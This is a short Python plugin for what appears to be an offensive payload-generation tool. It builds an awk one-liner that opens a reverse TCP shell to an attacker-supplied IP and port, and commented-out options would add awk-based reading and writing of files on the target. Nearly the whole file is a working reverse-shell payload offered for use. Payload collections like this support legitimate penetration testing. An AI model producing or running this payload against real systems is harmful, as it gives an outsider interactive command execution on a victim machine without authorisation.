from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        # self.add_args(
        #     "--shell",
        #     default="bash",
        #     choices=const.LINUX_SHELL,
        #     help="Select shell type on target machine"
        # )

        # self.add_args(
        #     "--fileread",
        #     help = "file to read"
        # )
        #
        # self.add_args(
        #     "--filewrite",
        #     help = "file to write",
        #     nargs = 2
        # )

        self.opts.description = "[ReverseShell][TCP] awk from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"

    def make_shell(self):
        # if self.args.fileread:
        #     self.shell = """awk '//' "{}""".format(self.args.fileread)
        #     self.shell += '"'
        # elif self.args.filewrite:
        #     self.shell = """awk -v LFILE={}""".format(self.args.filewrite[0])
        #     self.shell += """ 'BEGIN { """
        #     self.shell += """print "{}" >""".format(self.args.filewrite[1])
        #     self.shell += """LFILE }'"""
        # else:
        self.shell = """awk 'BEGIN {s ="""
        self.shell += """ "/inet/tcp/0/{}/{}";""".format(self.args.ip, self.args.port).format(self.args.ip, self.args.port)
        self.shell += """while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""